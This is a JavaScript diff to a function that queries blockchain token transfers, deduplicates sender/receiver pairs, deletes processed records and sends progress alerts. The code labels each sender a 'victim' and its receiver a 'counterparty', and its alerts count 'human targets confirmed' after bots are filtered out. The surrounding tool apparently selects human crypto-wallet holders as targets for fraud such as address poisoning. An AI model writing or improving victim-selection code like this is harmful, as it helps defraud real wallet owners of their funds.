@@ -478,27 +478,53 @@ async function fetchPendingTargets() {
 
     while (true) {
       pageCount++;
-      const rows = await withRetry(async () => {
+
+      // ─── Direct query (no RPC) — fetch raw rows, deduplicate in JS ───
+      // Fetch extra rows (3x batch size) to account for duplicate senders
+      const rawRows = await withRetry(async () => {
         const { data, error } = await supabase
-          .rpc('fetch_pending_targets', {
-            chain_id_param: chainId,
-            threshold_block: thresholdBlock,
-            offset_val: 0,
-            limit_val: BATCH_SIZE,
-          });
+          .from('token_transfers')
+          .select('sender, receiver, block_number')
+          .eq('chain_id', chainId)
+          .gte('block_number', thresholdBlock)
+          .order('block_number', { ascending: false })
+          .limit(BATCH_SIZE * 3);
         if (error) throw error;
-        return data;
-      }, `FetchPendingTargetsRPC_page_${pageCount}`);
+        return data || [];
+      }, `FetchDirect_page_${pageCount}`);
 
-      if (!rows || rows.length === 0) break;
+      if (!rawRows || rawRows.length === 0) {
+        logger.info(`No more transfers to process. Completed ${pageCount - 1} pages.`);
+        break;
+      }
 
-      logger.info(`Fetched ${rows.length} raw pairs (page ${pageCount}). Running Stage 1 + Stage 2 checks...`);
+      // Deduplicate by (sender, receiver) pair in JS
+      const seenPairs = new Set();
+      const rows = [];
+      for (const row of rawRows) {
+        const senderLower = (row.sender || '').toLowerCase();
+        const receiverLower = (row.receiver || '').toLowerCase();
+        const key = `${senderLower}_${receiverLower}`;
+        if (!seenPairs.has(key) && senderLower && receiverLower) {
+          seenPairs.add(key);
+          rows.push({
+            sender: senderLower,
+            receiver: receiverLower,
+            block_number: row.block_number,
+          });
+          if (rows.length >= BATCH_SIZE) break;
+        }
+      }
+
+      if (rows.length === 0) break;
+
+      logger.info(`Page ${pageCount}: Fetched ${rawRows.length} raw rows → ${rows.length} unique pairs. Running analysis...`);
 
       const TIMEOUT_MS = 90000;
 
       const evaluationResults = await promiseAllLimit(
         rows.map(async (row, index) => {
-          const sender = row.sender.toLowerCase();
+          const sender = row.sender;
 
           try {
             logger.info(`[Analyzer] Processing ${index + 1}/${rows.length}: ${sender}`);
@@ -519,7 +545,7 @@ async function fetchPendingTargets() {
 
             return {
               chain: chainName,
-              counterparty: row.receiver.toLowerCase(),
+              counterparty: row.receiver,
               victim: sender,
               processed: false,
             };
@@ -527,7 +553,7 @@ async function fetchPendingTargets() {
             logger.warn(`[Analyzer] Failed to analyze ${sender}: ${error.message}`);
             return {
               chain: chainName,
-              counterparty: row.receiver.toLowerCase(),
+              counterparty: row.receiver,
               victim: sender,
               processed: false,
             };
@@ -560,8 +586,9 @@ async function fetchPendingTargets() {
         logger.info(`Page ${pageCount}: All ${rows.length} rejected by heuristics.`);
       }
 
-      // 2. Delete ALL processed senders (both bots and humans) from token_transfers
-      const evaluatedSenders = [...new Set(rows.map(r => r.sender.toLowerCase()))];
+      // 2. Delete ALL evaluated senders from token_transfers
+      //    This ensures the next query gets fresh data
+      const evaluatedSenders = [...new Set(rows.map(r => r.sender))];
 
       if (evaluatedSenders.length > 0) {
         try {
@@ -578,20 +605,25 @@ async function fetchPendingTargets() {
               .in('sender', chunk);
 
             if (error) {
-              logger.error(`[Cleanup] Failed to delete senders from token_transfers: ${error.message}`);
+              logger.error(`[Cleanup] Failed to delete senders: ${error.message}`);
             } else {
               pageDeleted += count || 0;
             }
           }
 
           totalDeleted += pageDeleted;
-          logger.info(`Page ${pageCount}: Deleted ${pageDeleted} transfer records for ${evaluatedSenders.length} evaluated senders`);
+          logger.info(`Page ${pageCount}: Deleted ${pageDeleted} transfer records for ${evaluatedSenders.length} senders`);
         } catch (deleteError) {
           logger.error(`[Cleanup] Error deleting from token_transfers: ${deleteError.message}`);
         }
       }
 
-      if (rows.length < BATCH_SIZE) break;
+      // Progress logging every 10 pages
+      if (pageCount % 10 === 0) {
+        logger.info(`[Progress] Page ${pageCount} | Inserted: ${totalInserted} | Filtered: ${totalFiltered} | Deleted: ${totalDeleted}`);
+      }
+
+      // Safety limit
       if (pageCount > 10000) {
         logger.warn('Reached pagination safety limit (10000 pages). Stopping.');
         break;
@@ -608,7 +640,7 @@ async function fetchPendingTargets() {
 
     logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Deleted: ${totalDeleted} records | Total pending: ${totalInDb}`);
 
-    if (totalInserted > 0 || totalFiltered > 0) {
+    if (totalInserted > 0 || totalFiltered > 0 || totalDeleted > 0) {
       await safeSendAlert(
         `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered, ${totalDeleted} raw transfers cleaned. Total pending: ${totalInDb}`
       );
